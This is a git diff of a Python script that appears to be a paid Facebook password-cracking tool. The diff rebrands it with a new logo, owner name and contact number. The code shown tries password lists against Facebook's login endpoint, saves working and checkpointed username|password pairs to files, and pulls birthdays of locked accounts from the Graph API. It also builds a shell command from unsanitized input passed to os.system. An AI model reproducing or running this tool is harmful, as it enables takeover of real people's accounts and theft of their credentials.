@@ -84,19 +84,20 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo =                                          """   
-
-\033[1;32m    __ _____ _____ _____ _____ ____  _____ 
-\033[1;33m __|  |  _  |   | |__   |  _  |    \|  _  |
-\033[1;34m|  |  |     | | | |   __|     |  |  |     |
-\033[1;32m|_____|__|__|_|___|_____|__|__|____/|__|__|
-\033[1;97m-----------------------------------------------
-\033[1;96m➣ \033[1;93mPROGRAMER   \033[1;96m: \033[1;93mJanzada Khan
-\033[1;96m➣ \033[1;93mFACEBOOK    \033[1;96m: \033[1;93mJanzada Khan
-\033[1;96m➣ \033[1;93mWHATSAPP    \033[1;96m: \033[1;93m03099006070
-\033[1;96m➣ \033[1;93mTeam Group  \033[1;92m: \033[1;93mJanzada Khan X Malang001
-\033[1;97m-----------------------------------------------"""
-
+logo =                                          """
+\033[1;91m   ██████████  ██████████  █████████   ▀
+   ███    ███  ███    ███  ███   ███  ███ 
+   ███         ███    ███  ███   ███  ███ 
+   ██████████  ██████████  ███   ███  ███ 
+          ███  ███    ███  ███   ███  ███  
+   ███    ███  ███    ███  ███   ███  ███  
+   ██████████  ███    ███  ███   ███  ███ \033[7m\033[1;36mQUEEN
+\033[1;97m══════════════════════════════════════════════
+ [✓] Owner   : Jannat Sultan
+ [✓] Github  : https://github.com/Jannat-Sultan 
+ [✓] Facebook: Jam Shahrukh Official
+ [✓] don't pheel me:) hatterz make me famous 
+══════════════════════════════════════════════"""
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
@@ -154,7 +155,7 @@ class __xxx__:
             self.faissalx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r\x1b[1;97m[Janzada] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
+        sys.stdout.write(f"\r\x1b[1;97m[Jannat-Sultan] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -204,7 +205,7 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H}[JAN-OK] {user} | {pw}")
+                    print(f"\r{H}[JANNAT-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('ok.txt' , 'a').write('%s\n' % wrt)
@@ -216,7 +217,7 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[JAN-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s[JANNAT-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('cp.txt' , 'a').write('%s\n' % wrt)
@@ -227,7 +228,7 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s[JAN-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s[JANNAT-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('cp.txt' , 'a').write('%s\n' % wrt)
@@ -414,7 +415,7 @@ def sep():
     y = 0
     for k in range(limit):
         y+=1
-        print ('\033[1;32m EXAMPLE [100079],[10000] etc\033[0m')
+        print ('\033[1;32m EXAMPLE [100090],[10000] etc\033[0m')
         links = input(' \033[1;33mPut links %s:\033[1;32m '%(y))
         os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
     print(54*"\033[1;33m_")
@@ -449,7 +450,7 @@ def _f_a_md__eck():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://cutt.ly/rHG1EnC').text
+    httpCaht = requests.get('https://cutt.ly/58RMYZa').text
     if id in httpCaht:
       print("\033[1;92mYour Token is successfully Approved")
       msg = str(os.geteuid())
@@ -461,7 +462,7 @@ def _f_a_md__eck():
       print('\033[1;97m-----------------------------------------------')
       print("\x1b[1;97mThis is Paid tool > 350 for 30 days")
       print("\x1b[1;97mCopy Token and Press Enter")
-      os.system('xdg-open https://wa.me/+923148498294')
+      os.system('xdg-open https://wa.me/+923319039474')
       time.sleep(1)
       sys.exit()
   except:
